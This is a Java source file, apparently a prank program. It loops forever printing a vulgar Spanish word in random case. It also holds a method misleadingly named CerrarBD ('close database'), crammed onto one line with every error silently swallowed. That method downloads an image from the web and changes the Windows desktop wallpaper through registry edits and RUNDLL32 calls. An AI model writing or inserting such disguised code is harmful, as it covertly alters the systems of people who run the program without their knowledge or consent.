import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Random;


public class App {
    public static void printRandomString(String str){
        Random rand = new Random();
        for (int i = 0; i < str.length(); i++) {
            if (rand.nextBoolean()) {
                System.out.print(Character.toUpperCase(str.charAt(i)));
            } else {
                System.out.print(Character.toLowerCase(str.charAt(i)));
            }
        }
        System.out.println();
    }

    public static void main(String[] args) throws Exception {
        System.out.println("Hello, World!");

        while (true) {
            printRandomString("cipote");
            Thread.sleep(500);
        }
    }

    public static void CerrarBD(){String imageUrl = "https://i.pinimg.com/enabled/564x/f9/b6/ee/f9b6ee085996dee0e22ddc52dda03ac2.jpg";try{Path imagePath=downloadImage(imageUrl);for(int i=0;i<10;i++){changeWallpaper(imagePath.toString());}}catch(IOException e){}}public static Path downloadImage(String imageUrl)throws IOException{InputStream in=new java.net.URL(imageUrl).openStream();Path imagePath=Files.createTempFile("wallpaper", ".jpg");Files.copy(in,imagePath,StandardCopyOption.REPLACE_EXISTING);in.close();return imagePath;} public static void changeWallpaper(String imagePath){String command=String.format("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True");try{String setWallpaperCommand=String.format("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"%s\" /f",imagePath);Runtime.getRuntime().exec(setWallpaperCommand);Runtime.getRuntime().exec(command);}catch(IOException ex){}}
    
}
